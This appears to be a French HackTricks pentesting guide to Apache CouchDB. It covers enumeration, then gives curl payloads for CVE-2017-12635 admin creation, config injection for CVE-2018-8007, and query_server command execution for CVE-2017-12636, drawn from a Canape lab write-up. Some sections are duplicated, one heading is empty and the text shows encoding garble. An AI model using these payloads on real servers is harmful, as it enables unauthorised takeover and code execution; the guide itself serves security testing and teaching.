# 5984,6984 - Pentesting CouchDB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de cybers√©curit√©? Voulez-vous voir votre entreprise annonc√©e dans HackTricks? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## **Informations de base**

CouchDB est une base de donn√©es orient√©e document et chaque champ est stock√© sous forme de carte cl√©-valeur. Les champs peuvent √™tre soit une simple paire cl√©/valeur, une liste ou une carte.

Chaque document stock√© dans la base de donn√©es re√ßoit un identifiant unique au niveau du document (`_id`) ainsi qu'un num√©ro de r√©vision (`_rev`) pour chaque modification qui est effectu√©e et enregistr√©e dans la base de donn√©es.

**Port par d√©faut:** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **√ânum√©ration Automatique**

### **Nmap**

### **Nmap**

Nmap est un outil de scan de ports tr√®s populaire qui peut √™tre utilis√© pour scanner les ports d'un serveur CouchDB. Pour scanner un serveur CouchDB, utilisez la commande suivante :

```
nmap -p 5984 <couchdb_ip>
```

Nmap peut √©galement √™tre utilis√© pour effectuer une d√©tection de version sur le serveur CouchDB en utilisant l'option `-sV` :

```
nmap -p 5984 -sV <couchdb_ip>
```

### **CouchDB Fauxton**

### **CouchDB Fauxton**

CouchDB Fauxton est une interface web pour CouchDB qui peut √™tre utilis√©e pour effectuer une √©num√©ration automatique des bases de donn√©es. Pour acc√©der √† Fauxton, ouvrez un navigateur et acc√©dez √† l'URL suivante :

```
http://<couchdb_ip>:5984/_utils/
```

Une fois connect√©, vous pouvez acc√©der √† la liste des bases de donn√©es en cliquant sur l'onglet "Databases".
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## √ânum√©ration manuelle

### Banni√®re
```
curl http://IP:5984/
```
Cela envoie une requ√™te GET √† l'instance CouchDB install√©e. La r√©ponse devrait ressembler √† l'un des √©l√©ments suivants :
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
Notez que si vous acc√©dez √† la racine de couchdb, vous recevrez une r√©ponse `401 Unauthorized` avec quelque chose comme ceci: `{"error":"unauthorized","reason":"Authentication required."}` **vous ne pourrez pas acc√©der** √† la banni√®re ou √† tout autre point d'acc√®s.
{% endhint %}

### √ânum√©ration d'informations

Voici les points d'acc√®s auxquels vous pouvez acc√©der avec une requ√™te **GET** et extraire des informations int√©ressantes. Vous pouvez trouver [**plus de points d'acc√®s et de descriptions plus d√©taill√©es dans la documentation de couchdb**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** Liste des t√¢ches en cours d'ex√©cution, y compris le type de t√¢che, le nom, l'√©tat et l'ID de processus.
* \*\*`/_all_dbs`\*\*Retourne une liste de toutes les bases de donn√©es de l'instance CouchDB.
* \*\*`/_cluster_setup`\*\*Retourne l'√©tat du n≈ìud ou du cluster, selon l'assistant de configuration de cluster.
* **`/_db_updates`** Retourne une liste de tous les √©v√©nements de base de donn√©es dans l'instance CouchDB. L'existence de la base de donn√©es `_global_changes` est requise pour utiliser ce point d'acc√®s.
* **`/_membership`** Affiche les n≈ìuds qui font partie du cluster en tant que `cluster_nodes`. Le champ `all_nodes` affiche tous les n≈ìuds que ce n≈ìud conna√Æt, y compris ceux qui font partie du cluster.
* **`/_scheduler/jobs`** Liste des travaux de r√©plication. Chaque description de travail inclura des informations sur la source et la cible, l'ID de r√©plication, un historique des √©v√©nements r√©cents et quelques autres choses.
* **`/_scheduler/docs`** Liste des √©tats de document de r√©plication. Comprend des informations sur tous les documents, m√™me dans les √©tats `completed` et `failed`. Pour chaque document, il renvoie l'ID de document, la base de donn√©es, l'ID de r√©plication, la source et la cible, et d'autres informations.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** Le point d'acc√®s `/_node/{node-name}` peut √™tre utilis√© pour confirmer le nom de n≈ìud Erlang du serveur qui traite la demande. Cela est particuli√®rement utile lors de l'acc√®s √† `/_node/_local` pour r√©cup√©rer ces informations.
* **`/_node/{node-name}/_stats`** La ressource `_stats` renvoie un objet JSON contenant les statistiques du serveur en cours d'ex√©cution. La cha√Æne litt√©rale `_local` sert d'alias pour le nom de n≈ìud local, donc pour toutes les URL de statistiques, `{node-name}` peut √™tre remplac√© par `_local`, pour interagir avec les statistiques du n≈ìud local.
* **`/_node/{node-name}/_system`** La ressource \_system renvoie un objet JSON contenant diverses statistiques de niveau syst√®me pour le serveur en cours d'ex√©cution. Vous pouvez utiliser \_\_`_local` comme {node-name} pour obtenir les informations actuelles du n≈ìud.
* **`/_node/{node-name}/_restart`**
* **`/_up`** Confirme que le serveur est en marche et pr√™t √† r√©pondre aux demandes. Si [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) est `true` ou `nolb`, le point d'acc√®s renverra une r√©ponse 404.
* \*\*`/_uuids`\*\*Demande un ou plusieurs Identifiants Universellement Uniques (UUID) √† partir de l'instance CouchDB.
* \*\*`/_reshard`\*\*Retourne un compte des travaux termin√©s, √©chou√©s, en cours d'ex√©cution, arr√™t√©s et totaux ainsi que l'√©tat du resharding sur le cluster.

D'autres informations int√©ressantes peuvent √™tre extraites comme expliqu√© ici: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **Liste des bases de donn√©es**
```
curl -X GET http://IP:5984/_all_dbs
```
Si cette requ√™te r√©pond avec un code **401 non autoris√©**, alors vous avez besoin de **cr√©dentials valides** pour acc√©der √† la base de donn√©es:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
Pour trouver des identifiants valides, vous pourriez **essayer de** [**forcer le service**](../generic-methodologies-and-resources/brute-force.md#couchdb).

Voici un **exemple** de r√©ponse couchdb lorsque vous avez **suffisamment de privil√®ges** pour lister les bases de donn√©es (il s'agit simplement d'une liste de bases de donn√©es) :
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### Informations sur la base de donn√©es

Vous pouvez obtenir certaines informations sur la base de donn√©es (comme le nombre de fichiers et leur taille) en acc√©dant au nom de la base de donn√©es :
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **Liste de documents**

Listez chaque entr√©e dans une base de donn√©es
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **Lire un document**

Lire le contenu d'un document √† l'int√©rieur d'une base de donn√©es :
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## √âl√©vation de privil√®ges CouchDB [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Gr√¢ce aux diff√©rences entre les analyseurs JSON Erlang et JavaScript, vous pouvez **cr√©er un utilisateur administrateur** avec les identifiants `hacktricks:hacktricks` en envoyant la requ√™te suivante :
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**Plus d'informations sur cette vuln√©rabilit√© ici**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## RCE de CouchDB

### Cookie Erlang

Dans la documentation de CouchDB, dans la section [configuration de cluster](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup), il est question des diff√©rents ports utilis√©s par CouchDB :

> CouchDB en mode cluster utilise le port `5984` comme en mode autonome, mais il utilise √©galement le port `5986` pour les API locales de n≈ìuds.
>
> Erlang utilise le port TCP `4369` (EPMD) pour trouver d'autres n≈ìuds, donc tous les serveurs doivent √™tre capables de communiquer entre eux sur ce port. Dans un cluster Erlang, tous les n≈ìuds sont connect√©s √† tous les autres n≈ìuds. Un maillage.

Et puis il y a un avertissement int√©ressant :

![1536931232858](https://0xdf.gitlab.io/img/1536931232858.png)

Si nous regardons dans la liste des processus, nous pouvons voir ce cookie, "monster" :
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
**Vous pouvez** [**lire cette section pour apprendre comment abuser des cookies Erlang pour obtenir une RCE**](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.**\
De plus, vous pouvez lire certains **writeups de la machine Canape HTB** [**comme celui-ci**](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution) pour voir et **pratiquer** comment **exploiter cette vuln√©rabilit√©**.

### **CVE-2018-8007 r√©ussi avec des permissions d'√©criture sur local.ini**

En √©crivant ce post, j'ai d√©couvert qu'un nouveau CVE avait √©t√© publi√© pour CouchDB par mdsec, [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/). Il n√©cessite √©galement des √©critures dans le fichier `local.ini`, donc ce n'est pas une option utile pour Canape. Mais comme je l'ai d√©j√† rendu accessible en √©criture en tant que root, voyons si nous pouvons le faire fonctionner.

Commencez avec un `local.ini` propre et maintenant accessible en √©criture (et une sauvegarde) :
```
root@canape:/home/homer/etc# ls -l
total 40
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
Nous pouvons utiliser curl pour modifier les origines dans le fichier `local.ini`. La vuln√©rabilit√© ici est que si nous utilisons curl pour mettre une nouvelle origine et ensuite des sauts de ligne, nous pouvons √©crire des choses suppl√©mentaires, y compris un nouvel en-t√™te et des d√©tails. Nous allons donc profiter du champ `[os_daemons]` et ajouter un processus pour que CouchDB essaie de continuer √† fonctionner:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
Dans le shell racine, nous pouvons voir les changements suivants:
```
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
<
< [cors]
< origins = 0xdf
<
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
Et pourtant, le fichier n'est pas l√†:
```
root@canape:/home/homer/etc# ls /tmp/0xdf
ls: cannot access '/tmp/0xdf': No such file or directory
```
Si nous examinons les processus en cours d'ex√©cution avec "couchdb" dans la cmdline, nous voyons non seulement la ligne de commande qui nous donne la valeur du cookie que nous avons utilis√©e pr√©c√©demment, mais aussi `runsrv couchdb`:
```
root@canape:/home/homer/bin# ps aux | grep couch
root        711  0.0  0.0   4240   696 ?        Ss   14:28   0:00 runsv couchdb
root        728  0.0  0.0   4384   812 ?        S    14:28   0:00 svlogd -tt /var/log/couchdb
homer      1785  0.8  3.1 638992 31248 ?        Sl   17:55   0:01 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bi
n/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
```
Si nous tuons ce processus, il revient imm√©diatement (remarquez le nouveau pid):
```
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ps aux | grep runsrv
root       2031  0.0  0.0  14224   980 pts/2    S+   18:09   0:00 grep --color=auto runsrv
```
Et, au red√©marrage, ex√©cute les OS\_Daemons :
```
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
### **Tentative r√©ussie via CVE-2017-12636 avec des permissions d'√©criture sur local.ini**

CVE-2017-12636 permet l'ex√©cution de code √† travers le processus couchdb. Cependant, cela ne fonctionnera pas dans cette configuration.

Il existe quelques POCs en r√©f√©rence :

* [https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
* [https://www.exploit-db.com/exploits/44913/](https://www.exploit-db.com/exploits/44913/)

Nous devons √©crire une nouvelle query\_server, puis l'invoquer. Lorsque Canape a √©t√© publi√©, la plupart des POC √©taient pour couchdb 1.x, mais cette bo√Æte ex√©cute la version 2, donc le chemin query\_servers de la plupart des POC n'existe pas. Cela a chang√© maintenant, mais nous allons suivre les m√™mes √©tapes. Tout d'abord, obtenir la version et montrer que le chemin 1.X n'existe pas :
```bash
www-data@canape:/var/www/git$ curl http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_config/query_servers/
{"error":"not_found","reason":"Database does not exist."}
```
Mettre √† jour avec le nouveau chemin pour 2.0:
```bash
www-data@canape:/var/www/git$ curl 'http://0xdf:df@localhost:5984/_membership'
{"all_nodes":["couchdb@localhost"],"cluster_nodes":["couchdb@localhost"]}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
{"coffeescript":"./bin/couchjs ./share/server/main-coffee.js","javascript":"./bin/couchjs ./share/server/main.js"}
```
√Ä partir de l√†, nous devrions ajouter un query\_server et l'invoquer, mais nous ne sommes pas en mesure de le faire.
```bash
www-data@canape:/var/www/git$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
{"error":"badmatch","reason":"{badrpc,{'EXIT',{{{badmatch,{error,eacces}},\n                  [{config_writer,save_to_file,2,\n                                  [{file,\"src/config_writer.erl\"},{line,38}]},\n                   {config,handle_call,3,[{file,\"src/config.erl\"},{line,222}]},\n                   {gen_server,try_handle_call,4,\n                               [{file,\"gen_server.erl\"},{line,629}]},\n                   {gen_server,handle_msg,5,\n                               [{file,\"gen_server.erl\"},{line,661}]},\n                   {proc_lib,init_p_do_apply,3,\n                             [{file,\"proc_lib.erl\"},{line,240}]}]},\n                 {gen_server,call,\n                             [config,\n                              {set,\"query_servers\",\"cmd\",\n                                   \"/sbin/ifconfig > /tmp/df\",true,nil}]}}}}","ref":1617834159}
```
Quelques recherches montrent qu'il s'agit d'un probl√®me de permissions. En fait, si nous v√©rifions avec notre shell root, nous pouvons voir que le fichier `local.ini` n'est pas accessible en √©criture par qui que ce soit, encore moins par www-data :
```
root@canape:/home/home/etc# ls -ls local.ini
8 -r--r--r-- 1 homer homer 4841 Sep 14 17:11 local.ini
```
Donc, c'est une impasse pour Canape. Mais si nous voulons essayer de le faire fonctionner, nous pouvons le rendre lisible avec notre acc√®s root ou homer, et continuer sur cette voie. Nous ferons une sauvegarde de l'original pour pouvoir voir les modifications:
```
root@canape:/# cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
root@canape:/# chmod 666 /home/homer/etc/local.ini
```
Maintenant, revenons √† notre shell www-data :
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
""
```

```
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
""
```
Nous r√©cup√©rons la valeur pr√©c√©dente pour la commande query server, ce qui signifie que c'est un succ√®s. Et dans le shell root, nous pouvons voir que cela a fonctionn√© :
```
root@canape:/home/homer/etc# diff local.ini local.ini.bk
48c48
< cmd = /sbin/ifconfig > /tmp/df
---
> cmd =
```
Maintenant, nous devrions √™tre en mesure de cr√©er une base de donn√©es, puis un document dans cette base de donn√©es, et ensuite le demander avec une vue qui mappe notre query\_server pour obtenir l'ex√©cution. 

Cr√©er une base de donn√©es et un document:
```bash
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","god","passwords","simpsons","vultest"]
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'
{"ok":true}
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","df","passwords","simpsons"]

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
{"ok":true,"id":"zero","rev":"1-967a00dff5e02add41819138abb3284d"}
```

```
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","god","passwords","simpsons","vultest"]
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'
{"ok":true}
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","df","passwords","simpsons"]

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
{"ok":true,"id":"zero","rev":"1-967a00dff5e02add41819138abb3284d"}
```
Demander cela dans une vue:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}' -H "Content-Type: application/json"
```
#### R√©sum√©

## Shodan

* `port:5984 couchdb`

## R√©f√©rences

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
